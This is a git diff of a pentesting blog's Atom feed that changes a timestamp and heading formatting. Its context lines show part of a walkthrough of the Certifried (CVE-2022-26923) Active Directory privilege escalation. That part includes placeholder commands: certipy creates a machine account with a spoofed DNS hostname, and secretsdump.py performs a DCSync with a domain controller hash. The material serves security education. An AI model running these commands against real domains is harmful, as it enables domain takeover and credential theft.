@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-13T14:14:27+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-13T14:16:05+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
 
 <h1 id="the-attack-in-brief">The Attack In Brief</h1>
 <ol>
@@ -39,7 +39,7 @@
 <hr />
 
 <h1 id="attack-demonstration">Attack Demonstration</h1>
-<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed <code class="language-plaintext highlighter-rouge">DNSHostname</code></h2>
+<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed DNSHostname</h2>
 <p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; -user '&lt;NEW_COMPUTER_NAME&gt;' -dns &lt;DC_FQDN&gt;</code></p>
 
 <p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
@@ -64,7 +64,7 @@
 
 <p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
 
-<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing <code class="language-plaintext highlighter-rouge">DCsync</code> As The Impersonated Domain Controller</h2>
+<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing DCsync As The Impersonated Domain Controller</h2>
 <p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py -just-dc &lt;DOMAIN_FQDN&gt;/'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -hashes :&lt;RETRIEVED_HASH&gt;</code></p>
 
 <p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
